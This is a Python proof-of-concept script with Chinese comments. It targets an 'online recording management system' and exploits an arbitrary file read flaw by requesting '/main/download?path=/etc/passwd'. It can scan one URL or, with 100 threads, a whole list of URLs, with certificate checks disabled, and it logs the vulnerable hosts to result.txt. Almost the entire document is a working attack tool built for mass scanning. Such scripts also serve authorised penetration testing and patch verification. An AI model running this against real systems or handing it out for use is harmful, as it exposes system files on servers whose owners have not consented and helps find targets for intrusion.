#在线录音管理系统-任意文件读取.py
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   ____   ____  ____ _ ____  _ _____  ___  
 / ___| / ___|/ ___/ |___ \/ |___ / ( _ ) 
 \___ \| |  _| |  _| | __) | | |_ \ / _ \ 
  ___) | |_| | |_| | |/ __/| |___) | (_) |
 |____/ \____|\____|_|_____|_|____/ \___/ 
                                          
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="在线录音管理系统-任意文件读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/main/download?path=/etc/passwd'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False)
        
        if res.status_code == 200 and "root" in res.text:
            print(f"[+]该网站存在任意文件读取漏洞，url为{target}\n")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在任意文件读取漏洞")

    except Exception as e:
        print("[*]该网站无法访问")

if __name__ == '__main__':
    main()
